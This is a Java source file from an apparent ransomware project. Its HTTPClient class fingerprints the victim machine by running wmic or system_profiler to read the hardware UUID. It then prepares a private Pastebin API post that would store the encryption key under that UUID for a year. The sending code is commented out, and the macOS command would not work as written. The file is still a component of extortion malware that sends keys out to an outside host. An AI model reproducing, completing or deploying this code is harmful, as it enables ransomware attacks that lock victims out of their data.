package ransomware;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Formatter;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;

public class HTTPClient {
    private final CloseableHttpClient httpClient = HttpClients.createDefault();

    public HTTPClient() {

    }

    /*
     * public void getRequest() throws Exception { HttpGet request = new
     * HttpGet("https://www.google.com/search?q=mkyong");
     * 
     * // add request headers request.addHeader("custom-key", "mkyong");
     * request.addHeader(HttpHeaders.USER_AGENT, "Googlebot");
     * 
     * try (CloseableHttpResponse response = httpClient.execute(request)) {
     * 
     * // Get HttpResponse Status
     * System.out.println(response.getStatusLine().toString());
     * 
     * HttpEntity entity = response.getEntity(); Header headers =
     * entity.getContentType(); System.out.println(headers);
     * 
     * if (entity != null) { // return it as a String String result =
     * EntityUtils.toString(entity); System.out.println(result); }
     * 
     * } }
     */

    public void saveKey(String key) throws Exception {
        HttpPost post = new HttpPost("https://pastebin.com/api/api_post.php");
        String UUID = getUUID();
        System.out.println(UUID);

        List<NameValuePair> urlParams = new ArrayList<>();

        // Required
        urlParams.add(new BasicNameValuePair("api_dev_key", Config.DEV_KEY));
        urlParams.add(new BasicNameValuePair("api_option", "paste"));
        urlParams.add(new BasicNameValuePair("api_paste_code", key));
        // urlParams.add(new BasicNameValuePair("api_paste_code", URLEncoder.encode(key,
        // "UTF-8")));

        // Optional
        urlParams.add(new BasicNameValuePair("api_paste_private", "1"));
        urlParams.add(new BasicNameValuePair("api_paste_name", URLEncoder.encode(UUID, "UTF-8")));
        urlParams.add(new BasicNameValuePair("api_paste_expire_date", "1Y"));
        urlParams.add(new BasicNameValuePair("api_user_key", Config.USER_KEY));

        /*
         * post.setEntity(new UrlEncodedFormEntity(urlParams));
         * 
         * try (CloseableHttpClient httpClient = HttpClients.createDefault();
         * CloseableHttpResponse response = httpClient.execute(post)) {
         * System.out.println(EntityUtils.toString(response.getEntity())); }
         */
    }

    public String getUUID() throws IOException, InterruptedException {
        String OS = System.getProperty("os.name").toLowerCase();
        String UUID = "";
        if (OS.indexOf("win") >= 0) {
            StringBuffer output = new StringBuffer();

            Process SerNumProcess = Runtime.getRuntime().exec("wmic csproduct get UUID");
            BufferedReader sNumReader = new BufferedReader(new InputStreamReader(SerNumProcess.getInputStream()));

            String line = "";
            while ((line = sNumReader.readLine()) != null) {
                output.append(line + "\n");
            }
            UUID = output.toString().substring(output.indexOf("\n"), output.length()).trim();

        } else if (OS.indexOf("mac") >= 0) {
            String command = "system_profiler SPHardwareDataType | awk '/UUID/ { print $3; }'";
            StringBuffer output = new StringBuffer();
            Process SerNumProcess = Runtime.getRuntime().exec(command);
            BufferedReader sNumReader = new BufferedReader(new InputStreamReader(SerNumProcess.getInputStream()));
            String line = "";

            while ((line = sNumReader.readLine()) != null) {
                output.append(line + "\n");
            }

            String MachineID = output.toString().substring(output.indexOf("UUID: "), output.length()).replace("UUID: ",
                    "");
            SerNumProcess.waitFor();
            sNumReader.close();

            UUID = MachineID;
        }
        return UUID;
    }

    public void close() throws Exception {
        httpClient.close();
    }

    public String formatString(Byte args) {
        Formatter formatter = new Formatter();
        String formattedString = formatter.format("%02X", args).toString();
        formatter.close();
        return formattedString;
    }

}